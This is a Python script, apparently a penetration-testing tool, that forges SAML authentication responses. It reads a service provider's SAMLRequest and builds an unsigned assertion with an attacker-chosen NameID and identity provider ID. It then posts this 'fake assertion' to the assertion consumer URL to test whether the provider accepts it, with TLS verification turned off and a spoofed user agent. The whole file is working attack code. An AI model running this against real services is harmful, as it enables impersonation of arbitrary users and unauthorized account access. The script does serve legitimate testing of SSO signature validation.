import requests
import base64
import zlib
import random
import argparse
import re

import urllib3
urllib3.disable_warnings()

from urllib.parse import unquote
import urllib.parse

import isodate
from datetime import datetime
from datetime import timedelta

from lxml import etree
#from signxml import XMLSigner, XMLVerifier
#import signxml
#import saml2
#import xml.etree.ElementTree as ET

##
## TODO:    
##          Dyamically generate the assertion ID
##          Add file input for IdP response template
##          Add attribute claim mapping functionality
##          Add option to indicate whether the target is federated
##

def main():
    argParser = argparse.ArgumentParser()
    argParser.add_argument("-s", "--sp", type=ascii, help="service provider URL", required=True)
    argParser.add_argument("-i", "--idp", type=ascii, help="IdP entity ID value", required=True)
    argParser.add_argument("-n", "--nameid", type=ascii, help="name id value to use", required=True)
    argParser.add_argument("-u", "--ua", type=ascii, help="user agent value to use or 'random'", required=True)
    argParser.add_argument("-r", "--request", type=ascii, help="SP init request method", required=False)
    argParser.add_argument("-d", "--data", type=ascii, help="POST data", required=False)
    argParser.add_argument("-l", "--log", help="log output to a file",  action="store_true")
    argParser.add_argument("-v", "--verbose", help="verbose output",  action="store_true")
    args = argParser.parse_args()

    target_url = args.sp.replace("'", "")
    idp_entity_id = args.idp.replace("'", "")
    name_id_value = args.nameid.replace("'", "")
    user_agent_string = args.ua.replace("'", "")
    request_method = args.request.replace("'", "")
    post_data = args.data

    urllib3.disable_warnings()

    ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
    ]

    # SAML response template
    #response_template = '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="$response_id" Version="2.0" IssueInstant="$response_issue_instant" Destination="$assertion_consumer_url" InResponseTo="$response_to"><Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">$idp_issuer</Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="$assertion_id" IssueInstant="$assertion_issue_instant" Version="2.0"><Issuer>$idp_issuer</Issuer><Signature xmlns="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"/><Subject><NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">$name_id</NameID><SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><SubjectConfirmationData InResponseTo="$response_to" NotOnOrAfter="$not_on_or_after" Recipient="$assertion_consumer_url"/></SubjectConfirmation></Subject><Conditions NotBefore="$not_before" NotOnOrAfter="$not_on_or_after"><AudienceRestriction><Audience>$sp_issuer</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name="http://schemas.microsoft.com/identity/claims/tenantid"><AttributeValue>a7990218-9e89-9999-9999-17dcaef21578</AttributeValue></Attribute><Attribute Name="http://schemas.microsoft.com/identity/claims/objectidentifier"><AttributeValue>fd05960b-16a4-9999-9999-095e4b5725a6</AttributeValue></Attribute><Attribute Name="http://schemas.microsoft.com/identity/claims/displayname"><AttributeValue>Test User</AttributeValue></Attribute><Attribute Name="http://schemas.microsoft.com/identity/claims/identityprovider"><AttributeValue>https://sts.windows.net/a7990218-9e89-9999-9999-17dcaef21578/</AttributeValue></Attribute><Attribute Name="http://schemas.microsoft.com/claims/authnmethodsreferences"><AttributeValue>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AttributeValue><AttributeValue>http://schemas.microsoft.com/claims/multipleauthn</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname"><AttributeValue>Test</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname"><AttributeValue>User</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><AttributeValue>testuser@test.com</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"><AttributeValue>testuser@test.com</AttributeValue></Attribute><Attribute Name="UDC_IDENTIFIER"><AttributeValue>$udc_id</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant="$authn_instant" SessionIndex="$assertion_id"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>'
    response_template = '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="$response_id" Version="2.0" IssueInstant="$response_issue_instant" Destination="$assertion_consumer_url" InResponseTo="$response_to"><Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">$idp_issuer</Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="$assertion_id" IssueInstant="$assertion_issue_instant" Version="2.0"><Issuer>$idp_issuer</Issuer><Signature xmlns="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"/><Subject><NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">$name_id</NameID><SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><SubjectConfirmationData InResponseTo="$response_to" NotOnOrAfter="$not_on_or_after" Recipient="$assertion_consumer_url"/></SubjectConfirmation></Subject><Conditions NotBefore="$not_before" NotOnOrAfter="$not_on_or_after"><AudienceRestriction><Audience>$sp_issuer</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name="http://schemas.microsoft.com/claims/authnmethodsreferences"><AttributeValue>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AttributeValue><AttributeValue>http://schemas.microsoft.com/claims/multipleauthn</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname"><AttributeValue>Test</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname"><AttributeValue>User</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><AttributeValue>testuser@test.com</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"><AttributeValue>$name_id</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant="$authn_instant" SessionIndex="$assertion_id"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>'

    print("user_agent_string = " + user_agent_string)

    if(user_agent_string == 'random' or user_agent_string == ''):
        print("[*] Selecting a random user agent...")
        user_agent_string = random.choice(ua_list)

    print("[*] Using User Agent = " + user_agent_string)

    req_headers = {
        'User-Agent': user_agent_string
    }

    print("[*] Sending initial request to SP")
    print(" - URL = " + target_url)

    try:
        if request_method == 'GET':
            sp_init_response = requests.get(target_url, headers=req_headers, verify=False, allow_redirects=False)
        elif request_method == 'POST':
            post_data = "{'sso_id': '1'}"
            print("Using post data = " + post_data)
            sp_init_response = requests.post(target_url, headers=req_headers, verify=False, allow_redirects=False, data=post_data)
        else:
            print("ERROR: Unrecognized request method (request) use GET or POST")
            exit(1)
    except:
        print("ERROR: Exception detected with initial SP request, check URL and network.")
    else:
        print("[DEBUG] response.url: " + sp_init_response.url)
        print("[DEBUG] response.text: " + sp_init_response.text)
        print("[DEBUG] response.headers: " + str(sp_init_response.headers))
        print("[DEBUG] response.status_code: " + str(sp_init_response.status_code))

        if sp_init_response.status_code == 302:
            saml_binding = "REDIRECT"
            print("[*] Redirect detected")
            if "Location" in str(sp_init_response.headers) and "SAMLRequest" in str(sp_init_response.headers):
                print("[*] Extracting Location from header")
                header_match = re.search("'Location': '(.*?)',", str(sp_init_response.headers))
                header_location = header_match.group(1)
                print("- header location: " + header_location)
            
                print("[*] Extracting SAMLRequest from HTTP headers")
                saml_request = re.search("SAMLRequest=(.[%a-zA-Z0-9]*)&", str(sp_init_response.headers))
                request = unquote(saml_request.group(1))

                ## Extract RelayState
                relay_state_match = re.search("RelayState=(.*?)&", header_location)
                saml_relay_state = unquote(relay_state_match.group(1))
                print("- saml_relay_state: " + saml_relay_state)
            else:
                print("ERROR: Redirect detected, but Location or SAMLRequest is missing, check the SP URL: " + target_url)
                exit(1)
        elif sp_init_response.status_code == 200 and "<form" in sp_init_response.text:
            saml_binding = "POST"
            print("[*] POST form detected")
            print('[*] Extracting action from HTML form')
            action_target_search = re.search("action=\"(.*)\">", str(sp_init_response.text))
            print("action target = " + action_target_search.group(1))

            print("[*] Extracting SAMLRequest")
            saml_request = re.search("SAMLRequest\" value=\"([a-zA-Z0-9+=]*)\"", str(sp_init_response.text))
            request = unquote(saml_request.group(1))

            ## TODO: Extract RelayState

        else:
            print("ERROR: Could not detect SAML redirect or POST form")
            exit(1)

        print(" - SAMLRequest = " + request)
        
        print("[*] Decoding SAMLRequest")
        if saml_binding == "REDIRECT":
            rawbytes = zlib.decompress(base64.b64decode(request), -15)
        else:
            rawbytes = base64.b64decode(request)

        print("- saml_request: " + str(rawbytes))

        ## Extracting issuer
        print("[*] Extracting issuer")
        saml_issuer = re.search("<samlp:Issuer xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:assertion\">(.*?)</samlp:Issuer>",str(rawbytes))
        if saml_issuer is None:
            saml_issuer = re.search("<saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">(.*?)</saml2:Issuer>",str(rawbytes))
            if saml_issuer is None:
                saml_issuer = re.search("<saml:Issuer>(.*?)</saml:Issuer>",str(rawbytes))
                if saml_issuer is None:
                    print("ERROR: Unable to extract SAML issuer")
                    exit(1)
        
        print("- saml_issuer = " + saml_issuer.group(1))

        ## Extracting request ID
        print("[*] Extracting request ID")
        saml_auth_id = re.search("ID=\"(.[a-zA-Z0-9]*)\"", str(rawbytes))
        if saml_auth_id is None:
            print("ERROR: Unable to extract SAML issuer")
            exit(1)
        else:
            print("- request ID = " + str(saml_auth_id.group(1)))

        if saml_binding == "REDIRECT":
            ## Extracting destination URL (IdP URL)
            print("[*] Extracting destination URL")
            saml_destination = re.search("Destination=\"(.*?)\"", str(rawbytes))
            if saml_destination is None:
                print("WARN: Unable to extract Destination")
            else:     
                print("- saml_destination = " + saml_destination.group(1))

            ## Extracting ACS
            print("[*] Extracting ACS URL")
            saml_acs = re.search("AssertionConsumerServiceURL=\"(.*?)\"",str(rawbytes))
            if saml_acs is None:
                print("WARN: Unable to extract saml_acs")
            else:     
                print(" - saml_acs = " + saml_acs.group(1))

        print("[*] Generating timestamps")
        # Current time
        current_time = datetime.now()
        # Zulu format
        zulu_current_time = current_time.isoformat() + 'Z'
        current_time_str = str(zulu_current_time)
        print(" - the time is: " + current_time_str)
        
        # Expiration time
        expiration_time = datetime.now() + timedelta(minutes=360)
        # Zulu format
        zulu_expiration_time = expiration_time.isoformat() + 'Z'
        expiration_time_str = str(zulu_expiration_time)
        print(" - the delta time is: " + expiration_time_str);

        print("[*] Generating assertion from template")
        my_response = response_template.replace('$response_id',str(saml_auth_id.group(1)));
        if saml_binding != "POST":
            my_response = my_response.replace('$response_to', str(saml_auth_id.group(1)));
        ## This should be dynamic
        my_response = my_response.replace('$assertion_id','_fbd1234e-52d9-1234-895b-2fcce6161a13');
        my_response = my_response.replace('$response_issue_instant',current_time_str);
        my_response = my_response.replace('$assertion_issue_instant',current_time_str)
        my_response = my_response.replace('$authn_instant',current_time_str)
        my_response = my_response.replace('$not_before',current_time_str)
        my_response = my_response.replace('$not_on_or_after',expiration_time_str)        
        my_response = my_response.replace('$assertion_consumer_url', saml_acs.group(1))
        my_response = my_response.replace('$sp_issuer', saml_issuer.group(1))
        my_response = my_response.replace('$idp_issuer', idp_entity_id)
        my_response = my_response.replace('$name_id',name_id_value)
        ## 
        ## TODO: Attribute map for assertion claims
        ## UDC ID only used with Ellucian response template
        #my_response = my_response.replace('$udc_id', udcid)

        print("my_response = " + str(my_response))

        my_response_bytes = my_response.encode("utf-8")
        fake_response_enc = base64.b64encode(my_response_bytes)
        print("fake_response_enc = " + str(fake_response_enc))

        acs_post_url = saml_acs.group(1)
        print("ACS post url = " + acs_post_url)

        print("[*] POSTing fake assertion to ACS URL")
        acs_post_url_saml = acs_post_url + "?RelayState=" + saml_relay_state + "&SAMLResponse=" + str(fake_response_enc)
        attack_result = requests.post(acs_post_url_saml, headers=req_headers, verify=False)
        print("- Attack result:")
        print(attack_result.status_code)
        print(attack_result.headers)
    finally:
        print("[*] Done.")

if __name__ == '__main__':
    main()
